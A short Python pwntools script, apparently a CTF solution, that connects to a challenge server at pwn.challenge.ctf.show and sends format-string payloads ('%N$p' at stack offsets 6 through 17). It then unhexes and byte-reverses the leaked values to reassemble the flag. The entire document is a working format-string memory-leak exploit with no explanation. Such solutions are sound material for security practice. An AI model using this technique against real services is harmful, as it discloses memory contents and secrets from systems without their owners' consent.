from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28203)
flag=b''
for i in range(6,6+12):
    payload ='%{}$p'.format(str(i))
    io.sendlineafter(b'$ ',payload)
    aim = unhex(io.recvuntil(b'\n',drop=True).replace(b'0x',b''))
    flag += aim[::-1]
print(flag)
io.close()